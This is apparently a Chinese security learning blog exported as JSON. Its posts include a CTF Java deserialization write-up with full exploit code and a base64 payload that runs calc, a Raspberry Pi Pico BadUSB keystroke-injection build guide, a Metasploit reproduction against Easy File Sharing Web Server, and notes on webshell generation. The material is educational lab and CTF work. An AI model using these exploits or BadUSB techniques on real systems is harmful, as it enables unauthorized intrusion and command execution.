[{"title":"2021东华杯Ezgadget复现","path":"/2024/04/29/2021-dong-hua-bei-ezgadget-fu-xian/","content":"入门第一道题目 运行jar包，访问8888端口，发现只是正常index返回。 –&gt;所所以还是反编译jar包看一下： Tools123456789101112131415161718192021222324252627282930313233package com.ezgame.ctf.tools;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.util.Base64;/* loaded from: e14568b06e182.jar:BOOT-INF/classes/com/ezgame/ctf/tools/Tools.class */public class Tools &#123; public static byte[] base64Decode(String base64) &#123; Base64.Decoder decoder = Base64.getDecoder(); return decoder.decode(base64); &#125; public static String base64Encode(byte[] bytes) &#123; Base64.Encoder encoder = Base64.getEncoder(); return encoder.encodeToString(bytes); &#125; public static byte[] serialize(final Object obj) throws Exception &#123; ByteArrayOutputStream btout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(btout); objOut.writeObject(obj); return btout.toByteArray(); &#125; public static Object deserialize(final byte[] serialized) throws Exception &#123; ByteArrayInputStream btin = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(btin); return objIn.readObject(); &#125;&#125; 该类下是执行了一个base64的加密和解密以及序列化和反序列化的过程 ToStringBean1234567891011121314151617181920212223package com.ezgame.ctf.tools;import java.io.Serializable;/* loaded from: e14568b06e182.jar:BOOT-INF/classes/com/ezgame/ctf/tools/ToStringBean.class */public class ToStringBean extends ClassLoader implements Serializable &#123; private byte[] ClassByte; public String toString() &#123; ToStringBean toStringBean = new ToStringBean(); Class clazz = toStringBean.defineClass((String) null, this.ClassByte, 0, this.ClassByte.length); try &#123; clazz.newInstance(); return &quot;enjoy it.&quot;; &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); return &quot;enjoy it.&quot;; &#125; catch (InstantiationException e2) &#123; e2.printStackTrace(); return &quot;enjoy it.&quot;; &#125; &#125;&#125; 该类重写了tostring方法‘。ToStringBean: 继承了ClassLoader，而这可以通过调用defineClass，从而动态加载一个类，将这个类实例化从而达到命令执行。这里只要能调用toString就能加载我们传入的恶意字节码，其中ClassByte就是我们要传入的恶意字节码，由于是私有的，所以只能通过反射来进行赋值。 User1234567891011121314151617181920212223242526272829package com.ezgame.ctf.bean;import java.io.Serializable;/* loaded from: e14568b06e182.jar:BOOT-INF/classes/com/ezgame/ctf/bean/User.class */public class User implements Serializable &#123; private String UserName; private String PassWord; public String getUserName() &#123; return this.UserName; &#125; public void setUserName(String userName) &#123; this.UserName = userName; &#125; public String getPassWord() &#123; return this.PassWord; &#125; public void setPassWord(String passWord) &#123; this.PassWord = passWord; &#125; public String toString() &#123; return &quot;User&#123;UserName=&#x27;&quot; + this.UserName + &quot;&#x27;, PassWord=&#x27;&quot; + this.PassWord + &quot;&#x27;&#125;&quot;; &#125;&#125; 该类是典型的bean，规定了user的内容 重点地方是下面这个类 IndexController123456789101112131415161718192021222324252627282930313233343536373839package com.ezgame.ctf.controller;import com.ezgame.ctf.tools.Tools;import java.io.ByteArrayInputStream;import java.io.InputStream;import java.io.ObjectInputStream;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.springframework.beans.factory.xml.BeanDefinitionParserDelegate;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.ResponseBody;@Controller/* loaded from: e14568b06e182.jar:BOOT-INF/classes/com/ezgame/ctf/controller/IndexController.class */public class IndexController &#123; @RequestMapping(&#123;&quot;/&quot;&#125;) @ResponseBody public String index(HttpServletRequest request, HttpServletResponse response) &#123; return BeanDefinitionParserDelegate.INDEX_ATTRIBUTE; &#125; @RequestMapping(&#123;&quot;/readobject&quot;&#125;) @ResponseBody public String unser(@RequestParam(name = &quot;data&quot;, required = true) String data, Model model) throws Exception &#123; byte[] b = Tools.base64Decode(data); InputStream inputStream = new ByteArrayInputStream(b); ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); String name = objectInputStream.readUTF(); int year = objectInputStream.readInt(); if (name.equals(&quot;gadgets&quot;) &amp;&amp; year == 2021) &#123; objectInputStream.readObject(); return &quot;welcome bro.&quot;; &#125; return &quot;welcome bro.&quot;; &#125;&#125; 从中我们可以看到在readobject路由下，会接受一个POST参数data，之后会对data参数进行base64编码，并将其(InputStream)转化为一个对象流，从中读取UTF(readUTF())和INT(readInt()),将得到的UTF与“gadgets”对比，Int与2021对比，相等则执行objectInputStream.readObject(); 所以·对data参数进行反序列化，toStringBean类重写了toString方法。然后BadAttributeValueExpException类的readobject方法中调用了val的toString()方法，val可以传入toStringBean，从而在调用BadAttributeValueExpException的readobject的时候调用的toStringBean的toString()方法。 因而我们的exp为： 123456789101112131415161718192021222324252627282930313233343536import com.ezgame.ctf.tools.Tools;import com.ezgame.ctf.tools.ToStringBean;import javax.management.BadAttributeValueExpException;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class Exp &#123; public static void main(String[] args) throws Exception &#123; ToStringBean tostringbean = new ToStringBean(); //反射修改classByte属性 Field classByteField = tostringbean.getClass().getDeclaredField(&quot;ClassByte&quot;); classByteField.setAccessible(true); //C:\\Users\\a\\Desktop\\javaaudit\\webpoc\\src\\payload.java byte[] classByteone = Files.readAllBytes(Paths.get(&quot;C:\\\\Users\\\\a\\\\Desktop\\\\javaaudit\\\\webpoc\\\\src\\\\com\\\\ezgame\\\\ctf\\\\payload.class&quot;)); classByteField.set(tostringbean, classByteone); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(11223); //反射修改val属性 Field valField = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;); valField.setAccessible(true); valField.set(badAttributeValueExpException, tostringbean); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); //序列化payload.java的字节码 objectOutputStream.writeUTF(&quot;gadgets&quot;); objectOutputStream.writeInt(2021); objectOutputStream.writeObject(badAttributeValueExpException); byte[] bytes1 = byteArrayOutputStream.toByteArray(); String base64String1 = Tools.base64Encode(bytes1); System.out.println(base64String1); &#125;&#125; payload为： 123456789101112131415package com.ezgame.ctf;//这里包名不要变，要与jar包中保持一致import java.io.IOException;public class payload &#123; static &#123; try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch(IOException e)&#123; e.printStackTrace(); &#125; &#125;&#125; 使用cmd下命令java -jar payload.java编译成class文件 最终得到 1rO0ABXcNAAdnYWRnZXRzAAAH5XNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAFXQAA0V4cHQACEV4cC5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB+ABV4c3IAIWNvbS5lemdhbWUuY3RmLnRvb2xzLlRvU3RyaW5nQmVhbhPMVFon2dx5AgABWwAJQ2xhc3NCeXRldAACW0J4cHVyAAJbQqzzF/gGCFTgAgAAeHAAAAIDyv66vgAAADcAIAoACAARCgASABMIABQKABIAFQcAFgoABQAXBwAYBwAZAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAxwYXlsb2FkLmphdmEMAAkACgcAGgwAGwAcAQAEY2FsYwwAHQAeAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAHwAKAQAWY29tL2V6Z2FtZS9jdGYvcGF5bG9hZAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAACAAEACQAKAAEACwAAAB0AAQABAAAABSq3AAGxAAAAAQAMAAAABgABAAAABQAIAA0ACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAAAgACQAMAAwACgANAAsAEQANAA4AAAAHAAJMBwAFBAABAA8AAAACABA= 但传入参数时注意url编码，因为base64编码后存在+号，而url传参时会将+号识别为空格。","categories":["JAVA安全"]},{"title":"src清单","path":"/2024/04/22/src-qing-dan/","content":"0e9441d9e7a5d7a506bff3c52e525ad2678ba33a13d7e984e1e42069a593138ad5d1edc2c30dd716a2a6a74b47250fdcf9cb68321e3759960d488b0d8af1b7d4e1d20f9149b47e756838eaf213c8e3bb37b858fdecac3ec1303730120638993e22b01948f7e90753f93b6278b128eb7b2d955a7e1e4b994f2c4e5884533ed857406f86aea1dc83b04e608daa226845dfb5bf9162ad5491579ab7435144c4e2a656dba39092d73c49b143055096f9f2f0888333fffd454a3e01814369032adaeaf447f45cf1e99484a91a1aaad0462d7203c36a27cd526a82d6f25c0cca0d728cb764001062137e68d65dbc30bbde5a307e278017468eda704f9c4aaac43cbd5cbfccf8304df16f8e2b1b585469e7393d2f135e7f09fb0b04a4dc063c0d8caac900fa7407105797428fe4223956e354e56198253dc2924016ebdc40fc685d05d8afacd09d730ace56603061b62cbe469f7b4d083edc4529dc9b6225d4ff97731fdd46d722bbb2fe8edba855334cab9ee0bbda8bcf5fb77536fbe0b3de119aedd86d78320058a98efe3f8f65b523734470375d3297adde3fbad9a4da690903b75065aab857dd75c3faa46c863560bf842c8ab5db96306b60bb6a711ab3d9893c901fe96e6ef26d3eb0c10610c8422686a5c1d7857be0791bd5121e11a867bb6d3fc983c25e5c821b725bbbda7d71d34017ddbe19a1383613dbf6f35953df7577b405b1e225cf0577c17ba3b8336c74332e80c4995aeac55548ea1a2e94c026e8911c6a95af1a3f261ac4d7818b413241b55e1d36c6cea217c1a252e05d41f7d2fb3f6bdedd937b9b180b0ce41251ff605c6ce7a5388bfc85881879c90c650a28ebd0b8aa45fcdac103b45af47d449cbbf9d42bcede28dfa24d9b20418e1048546c14916247d4ea940f64f77b92378b7ffc678f00e11ffd00b3d12a0a6dc73fb256edf68d98192ca6e0cb9196a1c5b086b0f2ee0ef1e8287795b667b33fce6febbd8db7981aa9d2bfa07a1a08913d537dd70a67dfb2aafc53fa0b349fd75389751b14c3948ef7db43f3482f17f84d7587266a670dafbf9a958292afbc4a048c4429f52a0d9801ee4db85f9d48b53af0abb30eac5e1e51928537128cee498e7f60abe964fac2aa741db01531222127a6c12ecf8ef1b272d521046b37e076b55c4e14625988df779d7413eae9e0dbbd2b4a99450acbe9fab86bcc9cd9fa080b50756d0eee66d4dc5b9e166fd0572611f6a733a3f4a1eb975fba4d2b5c4731ce710b0a288042baf8bb8a48fb62f33b0fa8f75f32371d09570839c5560ef0d0831c4773f56da90cd275c0e0c3f0053fe6d608062072bd494e57feed7fcba337f08a104e8db467c12dbc1ec084878640a1a622e3c7f7ced8e534b87dc0e223e5b48ca2723bd8bd1e2d8f57af961a7165aa503a0a4ae032daf66b983c1c8688425548d2f575a96d9b1bc146f95f506788fa68b10b35cd0f1453741b48e8053e2bddb3de4a7cf05fe8b39b6d45720c431ff4ca6f7dc625eef42b1b8193be62087699125d0106cfe70a04cc3cc9353eca3a4f55f04f604eb11645911675398c5ad76a34bd075589f03e8e2010ef52b9a4e84b6719793072d2220651ed6072ecc2d9b6948f596826ee46a70817021eff2225f13b366250cc62cf17b0fd3aa1436983e4cfb9548fe5ac94d6a209ca7f56e6fbef1f8f01f17d47689b146f1efa33977d411b47efdaa73917d2b697dc3db38d5e0d802f5ee3d6aa659a7ba2b3e76fc78ed95d30a178f6fc296aef0154f498cc037cefda561d9eed2af36dcc9f98cf5d8ae47bccf17300b6ab4e4d594dd27da6ecf71354d465dc52e8190071e0326c1085ffc3f35ed9fb4c59caf5c013871a9fa085cf244c86b6985cc445c5b3b672aebf4c925368a801f0086121718798ffe93b7e0f90ffdebd4633c820f2d080f5f582cdad166695002b6ed6b49ef0d4d32335f9a7b337908da1c870bc206b05add21e61b0bd8768415079626f5eda198db19b8a2dbd750b0be321f4e709bc6928eb9738003ea29dd6ca08c73f7eb3ce1a68ae29929bf9334e790d49613cc9f4597a55492a6a0aa0322e09536284baf25f647a27e5491acbeb0b433297d9cbc1fd8f2e58799de00fcc2d5714379dd36a1171abb32653e23dbd6882c2ec76ba05711b1aea28fe41de3dea576dff628b7e04f8301f6703e006d98b3f66ebcbf4571bfd818ee6ea61e14d951e319b5a486a831535503efdc1a9239d679a8fcd9e963f20b4abff4ba28ee2fee970bb12c06e485711655f98cfda68b7b26e7da15cabab51fc83e1bd62ea761478ba5d9fb0450a023ca287d91d6185d7acf34bf8d0b0ce025c15c08fd3043b66d71798f6b4b2d2e5dee8653eb25f4b17d147eb8d366c8723ea5d36620754179cd0d938c1bac99aa1de49ee7894071b942db527812791cfa44ce4e223c58c635a49a53853bd38997585ff6e236eeebdf3951beb4d0da63ec618f5b32295843fb4093412571f01e558d5c305b1a6c88308f80ebb072b01605246ea0d5b9f4f226ca9734ab44dc3a5061919cc565073003a6b0ba3a04686f1db028de2665f4144bc4b87aba73bbcfcc3b0fdcdc00ee7c10d71dc75a800b8c88544960b95c2ed7743584d117a7edc0581f68ee0da12202541e55991902a754ec5443523ab8b702c8b81f73ece0f870818dab11f822eea6406231491325468767da974ff826dac582f538b066bd692af66f12b33f28e 请先输入密码查看文章内容.","tags":["漏洞src"],"categories":["漏洞src"]},{"title":"java安全学习打卡记录","path":"/2024/04/07/java-an-quan-xue-xi-da-qia-ji-lu/","content":"第一阶段2024.3.29 java资源查找 2024.4.5 java基础操作 2024.4.6，学习到了override和overload类 2024.4.8，在up主首席bug专家的java课程学习到了object对象 p78课时 2024.4.9，java课程学习到了封装 p82课时 2024.4.10 ，java课程学习到了多态，抽象，接口 p87课时 2024.4.11，java课程学习回顾 第二阶段SpringBoot学习2024.4.12，学习创建项目，hello world网站开始搭建和配置文件application.properties的认识 2024.4.14 学习了注解的用法 java反序列化–并行2024.4.16 学习了如何继承序列化接口-&gt;.ser文件，在反序列化中执行系统函数 1Process process = Runtime.getRuntime().exec(&quot;whoami&quot;); 使用如下读取数据： 123456InputStream inputStream = process.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); String line = &quot;&quot;; while ((line = reader.readLine())!= null) &#123; System.out.println(line); &#125; （@~@)Java读写内容好难受啊qwq!","tags":["java"],"categories":["JAVA"]},{"title":"python加载yml实现特定功能","path":"/2024/03/31/python-jia-zai-yml-shi-xian-te-ding-gong-neng/","content":"在一些python脚本常常会用到yml(yaml)文件去加载相关配置，那么我们也可以用yml文件储存可变的参数信息进而可拓展的动态加载可执行内容。这样可以大大增加可拓展型和维护性。 yaml文件yaml是一种标记语言，其语法和其他高级语言类似，并且可以简单表达清单、散列表，标量等数据形态。它使用空白符号缩进和大量依赖外观的特色，特别适合用来表达或编辑数据结构、各种配置文件、倾印调试内容、文件大纲（例如：许多电子邮件标题格式和YAML非常接近）。 语法 大小写敏感 使用缩进表示层级关系 缩进不允许使用tab，只允许空格 缩进的空格数不重要，只要相同层级的元素左对齐即可 ‘#’表示注释 以 - 开头的行表示构成一个数组，取消 - 表示构成一个字典 yaml的对象对象键值对使用冒号结构表示 key: value，冒号后面要加一个空格。也可以使用 **key:{key1: value1, key2: value2, …}**。但更为常用的是使用缩进表示层级关系。 例如一下例子：要严格注意缩进 1234567891011121314151617# @name: exmple.yaml# @Author: recyvan# @Date: 2024-4-1# @information: exmplelibray: - num1: fire - num2: requestsurl: headers: &quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;meth: menthod: GETparams: - key1: a=index.html - key2: b=index.pycmd: com: dir 通过上述yaml文件可以了解到该文件的创建作者，时间，对象信息，参数，子参数等内容。 python库-yaml那么创建好了简单的yaml文件，如何用python动态加载呢？这里使用到了python的一个库–yaml库来解析文件。安装方式： pip install PyYaml。 读取yaml文件数据123456789import yamlfile_yml = &quot;./exmple.yaml&quot;fp=open(file_yml,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;)rf=fp.read()fp.close() #tream=rf表示要加载的YAML文件的流（stream）,Loader=yaml.FullLoader指定了YAML文件的加载器（loader）ymlone = yaml.load(stream=rf,Loader=yaml.FullLoader)print(ymlone) 内容将以字典的方式返回： 读取yml指定参数在这个示例中，我们首先使用yaml.load()函数加载YAML文件，并将其解析为Python对象。然后，我们使用data.get(&#39;param_name&#39;)来获取特定参数的值 123456789import yamlfile_yml = &quot;./exmple.yaml&quot;with open(file_yml,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;) as fp: data = yaml.load(fp, Loader=yaml.FullLoader)# 获取特定参数的值param_value = data.get(&#x27;cmd&#x27;) # 打印参数值print(&quot;参数值:&quot;, param_value) 结果如下： 那如果是yml中的字典和列表呢？其实可以指定其参数进行获取： 123456789import yamlfile_yml = &quot;./exmple.yaml&quot;with open(file_yml,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;) as fp: data = yaml.load(fp, Loader=yaml.FullLoader)# 获取字典中的特定值desired_value = data.get(&#x27;param_dict&#x27;).get(&#x27;key2&#x27;)# 获取列表中的特定值desired_value = data.get(&#x27;param_list&#x27;)[1] 我们可以通过keys关键字获取所有键的列表： 12345678910# 解析yaml文件data = yaml.safe-load(data)# 获取所有键desired_value = data[&#x27;param_dict&#x27;].keys()#获取键的数量num_keys = len(desired_value)#遍历键的列表for key in desired_value: value = data[&#x27;param_dict&#x27;][key] print(f&#x27;键: &#123;key&#125;,值: &#123;value&#125;&#x27;)","tags":["网络安全，python"],"categories":["python"]},{"title":"GZCTF安装时数据库报错解决","path":"/2024/03/23/gzctf-an-zhuang-shi-shu-ju-ku-bao-cuo-jie-jue/","content":"GZCTF安装时数据库报错解决GZCTF 通过 Docker 镜像的方式提供，你可以通过 docker-compose 的方式快速部署一个功能完善的 CTF 平台。我们在安装时，尤其是在一些版本下的系统会存在数据库配置问题。 :one: 这个主要是在docker-compose up -d时，GZCTF会将一部分数据(账户信息，题目信息)储存在本地，用永久化存储，而在其中psqlsql的容器中会将sql的配置信息(postgresql.conf)挂在到本地。 :two:而一些版本下的系统或者psqsql(高版本)启用 SCRAM-SHA-256 密码身份验证来来确保安全性，但是GZCTF的两个容器通信使用的md5的加密方式，导致密码传入psqsql容器后校验失败。 :three:因此需要修改本地和容器内的加密方式为md5加密即可。 :four:进入容器修改会遇到sudo命令等不存在问题，下更新源apt-get update即可。 修改postgresql.conf参数文件：password_encryption &#x3D; md5 重新载入配置文件：pg_ctl reload -D $PGDATA 或SELECT pg_reload_conf(); 查看参数配置是否修改成功：SHOW password_encryption; 重置用户密码：\\password user_name 修改pg_hba.conf验证方法，然后reload即可：host all all 0.0.0.0&#x2F;0 scram-sha-256改为host all all 0.0.0.0&#x2F;0 md5 ##这里host 后面不一定是all all 同理本地修改即可 如果遇到docker容器内无法使用sudo命令 尝试以管理员方式进入：docker exec -u root -t -i id &#x2F;bin&#x2F;bash 使用–privileged&#x3D;true进行赋权：docker run -it –privileged&#x3D;true -u&#x3D;root id &#x2F;bin&#x2F;bash","tags":["psqsql"],"categories":["GZCTF"]},{"title":"Raspberry-pico-W制作badusb","path":"/2024/03/03/raspberry-pico-w-zhi-zuo-badusb/","content":"BadUsb与HID攻击BadUsb BadUSB 是一种利用 USB 固件固有漏洞的攻击。此类攻击会对 USB 设备进行重新编程，使其充当人机接口设备；一旦经过重新设计，USB 设备就会被用来在受害者的计算机上谨慎地执行命令或运行恶意程序。 ​ ——BADUSB 其是带有嵌入式固件的闪存驱动器，可用于重新编程设备并允许它充当人机界面小工具，例如键盘、鼠标或耳机。它们用于通过有效地伪装成人机接口设备 （HID） 在计算机上执行各种操作。BadUSB可以预先编程以在计算机上键入字符(无需物理操作)。插入后就可以直接开始工作，甚至执行需要同时使用两个或多个键的复杂击键。 HID攻击HID（Human InterfaceDevice），是指计算机直接与人交互的设备，例如键盘、鼠标等。BadUsb攻击便属于其中一种。攻击者通过将USB设备模拟成为键盘，让电脑识别成为键盘，然后进行脚本模拟按键进行攻击。 pc端上的HID一般指的是USB-HID标准，大多是指微软在USB委员会上提议创建的一个人体学输入设备工作组。 Raspberry pico WRaspberry Pi Pico 是一款搭载了 RP 2040 芯片的微处理器开发板。对于 Pico 的编程开发，官方开发了 Pico C&#x2F;C++ SDK 和 Pico Python SDK 软件开发工具包，用户可以选择 C&#x2F;C++ 或者 Python 对 Pico 进行开发。 其规格参数如下： Python SDK 开发制作badusb Python SDK 开发 Pico 的思路是，将 MicroPython（微处理器上运行的 Python 固件）拖拽到 Pico 中，然后将计算机上的 Python (3)代码传给 Pico 运行。树莓派官网提供了MicroPython固件，只需要将其烧录进去即可。已经编译好的固件：getting-started这里可以下载到 首先按住BOOTSET选项并链接USB接口到计算机上，其将显示为名为 RPI-RP2 的可移动媒体设备（但注意是识别出来容量可能有误，具体按照产品参数为准）并生成INDEX.HTM和INFO_UF2.TXT文件 下载adafruit-circuitpython-raspberry_pi_pico-en_US-8.2.10.uf2 到设备的根目录下，大约3秒后设备将会自动重启，并命名为CIRCUITPY设备并重新连接。生成以下文件： 下载安装包 并将lib下的这些文件(夹)放入到设备的lib目录下： 将下载文件中的下列文件移动到设备根目录下： 完成后电脑会自动打开cmd执行helloword代码。其中payload.dd装载的是执行的脚本 USB 启用&#x2F;禁用模式对于攻击或测试时，可能并不想要显示出或被是辨别成大容量储存设备 进入设置模式。 将您的有效负载脚本复制到 pico-ducky。 断开 pico 与主机的连接。 GND在引脚 18 ( ) 和引脚 20 ( )之间连接跳线GPIO15。这将防止 pico-ducky 在插入目标计算机时显示为 USB 驱动器。 取下跳线并重新连接到您的电脑以重新编程。 pico上同时可以储存多个有效载荷，其与引脚的关系为： GP4 - payload.dd GP5 - payload2.dGP10 - payload3.dd GP11 - payload4.dd pico的重置在使用时经常会使用到重置功能来完成特定功能和解决一些问题，具体操作如下： 从flash_nuke.uf2下载重置固件 按住 Pico 上的 BOOTSEL 按钮，将 USB 电缆插入计算机（该步骤会删除掉设备的所有内容）。 当 设备 RPI-RP2被计算机识别时，将 flash_nuke.uf2 文件复制到 设备 BadUsb—-payload.dd编辑如果想实现自定义的脚本命令攻击，其主要更改的便是payload.dd文件 首先要理解payload.dd文件是以什么方式(语言)编写的。这里参考“官方的解释”《DuckyScript™ 快速参考》 REM:\t命令不执行任何击键注入功能。REM它的名字来源于单词“remark”。虽然REM空行可用于在有效负载内添加垂直间距，但空行也是可接受的，并且不会被编译器处理。 STRING: 命令STRING击键注入（类型）一系列击键。必要时STRING按住修饰键将自动解释大写字母。SHIFT该STRING命令还将自动按 SPACE 光标键，但尾随空格将被省略。 STRINGLN: 命令（如STRING）将注入一系列击键，然后以回车符 ( ENTER) 终止。 光标键：用于将光标导航到屏幕上的不同位置，主要有： 123456UP DOWN LEFT RIGHTUPARROW DOWNARROW LEFTARROW RIGHTARROWPAGEUP PAGEDOWN HOME ENDINSERT DELETE DEL BACKSPACETABSPACE 基本修饰键：与另一个键组合使用以执行特殊功能。PC 的常见键盘组合包括熟悉的CTRL c复制、CTRL x剪切和CTRL v粘贴键盘组合。注意的时windows键命令为GUI DELAY: 命令指示 USB Rubber Ducky 暂时暂停有效负载的执行。当部署必须“等待”元素（例如窗口）加载的有效负载时，这非常有用。该DELAY命令接受以毫秒为单位的时间参数。注意最小延迟值为 20 比较和逻辑运算：该脚本语言同样支持数学比较逻辑符号和逻辑运算符 。 WHILE : 支持WHILE的循环语句。： 1234567VAR $FOO = 42 //$FOO自定义变量WHILE ( $FOO &gt; 0 ) STRINGLN This message will repeat 42 times. $FOO = ( $FOO - 1 )END_WHILE //结束标识 该脚本还支持其实还有诸如自定义函数，载荷隐藏，抖动，随机化等更为复杂的命令和功能。 pico W的ap网络功能待更新&gt;&gt;&gt;&gt;……….(提醒：实用软件：Thonny )","tags":["pico"],"categories":["hack硬件"]},{"title":"网络测试-efssetup_20181复现","path":"/2023/12/29/wang-luo-ce-shi-efssetup-20181-fu-xian/","content":"网络渗透实验复现作业-efssetup_20181复现 环境搭建环境梳理 VM下windows10系统，ip：192.168.65.143 攻击机：VM下kali系统，ip：193.168.65.128，物理机windows11 靶机无使用杀毒软件 搭建流程将插件下载至虚拟机，并双击exe程序进行安装 等待安装完成后，修改url地址为本地使用IP地址，关闭80端口的其他服务，或者修改该程序的端口 确认windows防火墙开放了指定端口即可安装成功。 漏洞复现方法一1.kali下使用nmap进行扫描该ip,查看存在哪些服务 发现靶机开放了80端口，且部署的服务为 Easy File Sharing Web Server httpd 6.9 2.使用searchsploit搜索该服务 下载该脚本，直接利用（这里原本想使用6.9版本，但执行后一直被拒绝） 执行发现计算器已被弹起（这里的脚本为python2脚本，应使用python2） 方法二方法一只能实现固定程序或命令的执行，无法进行交互，因此可以使用msf进行漏洞利用拿到shell 1.搜索该服务 设置好该漏洞，并进行执行，拿到shell 生成主控端、被控端这里使用MSFPC进行生成exe可执行程序进行控制 将可执行脚本上传到windows上并等待执行,使用msf进行上传 kali进行监听443，windows进行执行，使用handler进行监听 随意下载文件例如下web.config到当前目录 所遇问题 之前的python脚本和msf在进行攻击时存在机率是的服务崩溃（尤其是python脚本） 生成主控端、被控端，其实msf漏洞利用是实现获得shell但是通过handler再次获得是为了巩固学习 对于msfpc生成的脚本建议多次执行以防止连接失败 使用msf进行连接时，务必要关闭掉windwos10的实施监控，否则服务将会被删除或服务崩溃。","tags":["easy file sharing server"],"categories":["网络渗透测试"]},{"title":"关于aspx文件和dll文件的关系的学习","path":"/2023/12/27/guan-yu-aspx-wen-jian-he-dll-wen-jian-de-guan-xi-de-xue-xi/","content":"在上班时发现一个问题：在畅捷通T+服务当中存在一个任意目录文件上传，但是该应用是整套程序进行了预编译，无法对aspx文件进行解析，因此只能上传与之相关的dll和compiled文件 ASP.NETASP.NET 是一个免费的 Web 框架，用于使用 HTML、CSS 和 JavaScript 构建出色的网站和 Web 应用程序。 还可以创建 Web API 并使用实时技术，例如 Web 套接字。ASP.NET可以运行在安装了.NET Framework的IIS服务器上。 ASP 和 ASPX 的区别在于 ASP 运行在 IIS 上，而 ASPX 运行在 .NET 框架上。 他们使用不同的编码语言。 ASP 使用 VBscript 作为其编码语言，而 ASPX 使用 C# 和 VB.NET 作为其编码语言。 因此ASPX文件可以执行c#中的系统命令函数。 ASPX文件的预编译相较于动态编译，预编译的速度更快，同时可以防止源代码被查看。在网站部署时使用aspx文件进行编译，转换成dll文件，放到指定位置，.NET程序便会在运行时会优先加载bin目录下的程序集 即index.aspx -&gt; /bin/index.dll 也就是说在访问index.aspx时，程序会去寻找&#x2F;bin目录下的index.dll文件加载网页(即使访问的目录下没有index.aspx文件)。 哥斯拉生成CShapDynamicPayload (.net2.0及以上)使用哥斯拉生成aspx文件，文件生成后放到一个单独的文件，方便接下来复现 aspnet_compiled程序dll与compiled—————-待更新—————待更新——————–待更新———————–待更新—————–待更新————待更新————","tags":["ASP.NET"],"categories":["windows"]},{"title":"python之request库","path":"/2023/12/24/python-zhi-request-ku/","content":"在复现一些web的CVE时，多会用到python脚本进行辅助攻击和利用，其中利用追到的无非就是requets库了。 requests库安装 使用pip install requests即可下载该库，使用import即可导入该库 在github上下载源码进行编译安装，执行以下命令： 12git clone git://github.com/kennethreitz/requests.gitpython setup.py install 单一命令使用现在使用易优CMS进行演示 requests.get函数可以用来发送来发送http请求，并返回得到的数据包（默认保存在text文件中）。 当然上述命令用于发送get请求，参数可以直接拼接到url中，但如果post请求，则因该使用request.post 函数 在网站的后台登录出有post传参用户名和密码： 一般大多情况下post传参使用application&#x2F;x-www-form-urlencoded格式，在requests中使用字典的格式被requests模块并传参。 当然reuquests还有PUT、DELETE等传参方式。 返回参数的利用调用 requests 请求之后，会返回一个 response 对象，该对象包含了具体的响应信息，如状态码、响应头、响应内容等。 返回类型 解释（具体含义） 